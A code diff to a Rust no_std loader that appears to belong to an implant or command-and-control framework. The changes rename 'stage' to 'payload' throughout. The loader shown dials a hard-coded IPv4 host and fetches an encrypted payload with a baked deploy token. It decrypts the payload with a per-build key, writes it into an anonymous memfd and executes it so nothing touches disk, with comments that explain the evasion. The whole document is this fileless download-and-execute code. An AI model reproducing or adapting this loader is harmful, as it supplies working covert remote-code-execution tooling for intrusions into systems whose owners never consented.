@@ -1,13 +1,13 @@
-//! The stage-0 loader (architecture.md Sec 6, the staging half). One
+//! The loader (architecture.md Sec 6, the loader tier). One
 //! straight-line exchange, no library beyond core and AES-GCM:
 //!
 //! 1. dial the baked literal IPv4 front,
-//! 2. GET the baked stage route with the baked deploy token,
-//! 3. authenticate the sealed stage -- the R1 wire shape every envelope
-//!    purpose uses, under the stage AAD and the per-build key -- failing
-//!    closed on any mismatch,
+//! 2. GET the baked loader payload route with the baked deploy token,
+//! 3. authenticate the sealed payload -- the R1 wire shape every envelope
+//!    purpose uses, under the loader payload AAD and the per-build key --
+//!    failing closed on any mismatch,
 //! 4. write the opened bytes to a memfd and exec them through the anonymous
-//!    fd, so the stage never lands on the filesystem.
+//!    fd, so the payload never lands on the filesystem.
 //!
 //! The security property is step 3: nothing executes that did not open under
 //! the baked key. A swapped or tampered response, a wrong-front answer, a
@@ -18,7 +18,7 @@
 //!
 //! Exit codes name the failed step for the shell they land in: 3 socket, 4
 //! connect, 5 send, 6 short response, 7 bad status, 8 malformed response, 9
-//! stage over buffer, 10 memfd, 11 memfd write, 12 not the R1 shape, 13 seal
+//! payload over buffer, 10 memfd, 11 memfd write, 12 not the R1 shape, 13 seal
 //! did not open, 14 exec.
 
 #![no_std]
@@ -183,16 +183,16 @@ const R1_KEY_ID: usize = 16;
 const R1_NONCE: usize = 12;
 const R1_TAG: usize = 16;
 
-/// The purpose tag binding a sealed stage to the stage fetch, so no other
-/// purpose's ciphertext (a contact body, an enroll answer) can be reflected
-/// down this route and opened as a stage.
-const STAGE_AAD: &[u8] = b"rod-stage-v1";
+/// The purpose tag binding a loader's sealed payload to its fetch, so no
+/// other purpose's ciphertext (a contact body, an enroll answer) can be
+/// reflected down this route and opened as the delivery.
+const PAYLOAD_AAD: &[u8] = b"rod-loader-payload-v1";
 
 /// The response buffer's fixed size, in bytes: a .bss window, in-memory
 /// only.
 const BUFFER_BYTES: usize = 8 << 20;
 
-/// The response buffer. Stages over it fail at 9 rather than silently
+/// The response buffer. Payloads over it fail at 9 rather than silently
 /// truncating; the reference implant's shapes all fit with room to spare.
 static mut BUFFER: [u8; BUFFER_BYTES] = [0u8; BUFFER_BYTES];
 
@@ -259,7 +259,7 @@ unsafe fn run() -> ! {
         exit(4);
     }
 
-    // The request: the stage route, the deploy token, and nothing else. An
+    // The request: the payload route, the deploy token, and nothing else. An
     // HTTP/1.0 line lets the simplest fronts answer and close; fronts that
     // keep the connection alive answer with Content-Length, which the read
     // loop below honors.
@@ -320,11 +320,11 @@ unsafe fn run() -> ! {
     let body_end = want.unwrap_or(total);
     if body_end > total {
         // The front closed before the Content-Length it promised: a short
-        // response, not a stage.
+        // response, not a delivery.
         exit(6);
     }
 
-    // The seal: the R1 shape, the baked key id, the stage AAD. The
+    // The seal: the R1 shape, the baked key id, the payload AAD. The
     // ciphertext opens in place, over the bytes it arrived in.
     let buffer = (&raw const BUFFER).cast::<u8>();
     let body = core::slice::from_raw_parts(buffer.add(header_end), body_end - header_end);
@@ -339,28 +339,28 @@ unsafe fn run() -> ! {
     let tag_start = body.len() - R1_TAG;
     let tag = GenericArray::from_slice(&body[tag_start..]);
     let cipher = Aes256Gcm::new(GenericArray::from_slice(&baked::KEY));
-    let stage = core::slice::from_raw_parts_mut(
+    let delivered = core::slice::from_raw_parts_mut(
         (&raw mut BUFFER).cast::<u8>().add(header_end + prefix + R1_NONCE),
         tag_start - prefix - R1_NONCE,
     );
-    if cipher.decrypt_in_place_detached(nonce, STAGE_AAD, stage, tag).is_err() {
+    if cipher.decrypt_in_place_detached(nonce, PAYLOAD_AAD, delivered, tag).is_err() {
         exit(13);
     }
 
     // The exec: an anonymous memfd and the kernel's own ELF loader. Nothing
-    // was written to a path at any step; the stage's bytes live in this
+    // was written to a path at any step; the payload's bytes live in this
     // buffer and the fd alone.
     let mfd = sys_::call3(sys_::MEMFD_CREATE, b"rod\0".as_ptr() as usize, 0, 0);
     if mfd < 0 {
         exit(10);
     }
     let mut written = 0usize;
-    while written < stage.len() {
+    while written < delivered.len() {
         let w = sys_::call3(
             sys_::WRITE,
             mfd as usize,
-            stage.as_ptr() as usize + written,
-            stage.len() - written,
+            delivered.as_ptr() as usize + written,
+            delivered.len() - written,
         );
         if w <= 0 {
             exit(11);
